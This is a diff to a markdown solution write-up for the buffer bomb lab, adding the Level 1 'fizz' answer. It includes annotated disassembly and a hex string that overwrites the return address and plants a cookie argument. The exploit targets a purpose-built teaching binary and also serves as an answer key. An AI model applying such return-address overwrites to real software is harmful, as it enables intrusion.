@@ -4,9 +4,9 @@
 > conventions and stack organization. It involves applying a series of buffer
 > overflow attacks on an executable file bufbomb in the lab directory.
 
-## Level 0: Candle/Smoke
+## Level 0: Candle/smoke
 
-Target: get BUFBOMB to execute the code for smoke when getbuf executes its return statement
+Target: get BUFBOMB to execute the code for `smoke` when getbuf executes its return statement
 
 Get `smoke` address from assembly code: `08049415`
 
@@ -40,4 +40,54 @@ So, the string should be:
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 15 94 04 08
+```
+
+## Level 1: Sparkler/fizz
+
+Target: get BUFBOMB to execute the code for `fizz` with argument `cookie`
+
+Assembly code of `fizz`:
+
+```
+08049442 <fizz>:
+ 8049442:	55                   	push   %ebp
+ 8049443:	89 e5                	mov    %esp,%ebp
+ 8049445:	83 ec 08             	sub    $0x8,%esp
+ 8049448:	8b 55 08             	mov    0x8(%ebp),%edx
+ 804944b:	a1 90 d1 04 08       	mov    0x804d190,%eax
+ 8049450:	39 c2                	cmp    %eax,%edx      # check if %edx equals to cookie locating in 0x804d190
+ 8049452:	75 22                	jne    8049476 <fizz+0x34>
+ 8049454:	83 ec 08             	sub    $0x8,%esp
+ 8049457:	ff 75 08             	push   0x8(%ebp)
+ 804945a:	68 23 b0 04 08       	push   $0x804b023
+ 804945f:	e8 1c fc ff ff       	call   8049080 <printf@plt> # print fizz
+ 8049464:	83 c4 10             	add    $0x10,%esp
+ 8049467:	83 ec 0c             	sub    $0xc,%esp
+ 804946a:	6a 01                	push   $0x1
+ 804946c:	e8 6f 09 00 00       	call   8049de0 <validate>
+ 8049471:	83 c4 10             	add    $0x10,%esp
+ 8049474:	eb 13                	jmp    8049489 <fizz+0x47>
+ 8049476:	83 ec 08             	sub    $0x8,%esp
+ 8049479:	ff 75 08             	push   0x8(%ebp)
+ 804947c:	68 44 b0 04 08       	push   $0x804b044
+ 8049481:	e8 fa fb ff ff       	call   8049080 <printf@plt> # print buzz, which is wrong
+ 8049486:	83 c4 10             	add    $0x10,%esp
+ 8049489:	83 ec 0c             	sub    $0xc,%esp
+ 804948c:	6a 00                	push   $0x0
+ 804948e:	e8 bd fc ff ff       	call   8049150 <exit@plt>
+```
+
+Similarly, the first 50 bytes mean nothing. 50~53 mean the address of `fizz` which is `08049442`.
+54~57 mean nothing. 58~61 mean the cookie `20ba0521`.
+Therefore, the string should be:
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 42 94 04 08 00 00
+00 00 21 05 ba 20
 ```
